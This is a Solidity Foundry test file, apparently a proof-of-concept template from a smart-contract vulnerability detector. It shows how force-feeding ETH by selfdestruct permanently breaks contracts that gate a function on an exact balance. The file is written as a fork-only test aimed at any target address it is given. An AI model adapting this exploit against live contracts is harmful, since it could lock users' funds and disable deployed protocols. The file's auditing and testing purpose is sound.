// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Strict balance equality DoS (forced ETH breaks ==)
/// @notice Detector: strict-balance. The target requires
///         address(this).balance == EXACT. Anyone can force-feed ETH
///         (selfdestruct / coinbase) so the equality NEVER holds again,
///         permanently bricking the gated function.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt the gated function to the
///      target's real one.

contract Forcer {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // TODO: adapt to the target's real balance-gated function.
        bytes memory gatedCall = abi.encodeWithSignature("distribute()");

        // Force-feed 1 wei so address(this).balance can never equal the
        // exact value again.
        new Forcer{value: 1 wei}(payable(target));

        vm.prank(attackerEOA);
        (bool ok,) = target.call(gatedCall);
        console.log("gated function ok after force-feed:", ok);
        assertTrue(!ok, "exploit did not reproduce: gated function still works after force-feed");
    }
}
